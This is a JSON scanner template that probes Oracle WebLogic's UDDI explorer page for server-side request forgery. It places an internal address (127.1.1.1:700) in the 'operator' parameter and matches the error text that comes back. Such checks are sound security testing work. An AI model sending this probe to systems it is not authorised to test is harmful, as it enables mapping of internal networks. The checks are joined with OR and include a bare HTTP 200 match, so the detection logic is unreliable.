{
    "Name": "weblogic-ssrf",
    "Description": "weblogic-ssrf",
    "Product": "weblogic",
    "author": "chumeng",
    "Request":[
        {
        "Method": "GET",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36","Cookie":"publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|;"},
        "Uri":"/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.1.1.1:700",
        "Port":"",
        "Data":"",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"OR",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "&#39;127.1.1.1&#39;, port: &#39;700&#39;"
                }, {
                    "Operation": "contains", 
                    "Key":"",
                    "Value": "Socket Closed"
                    },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
]}
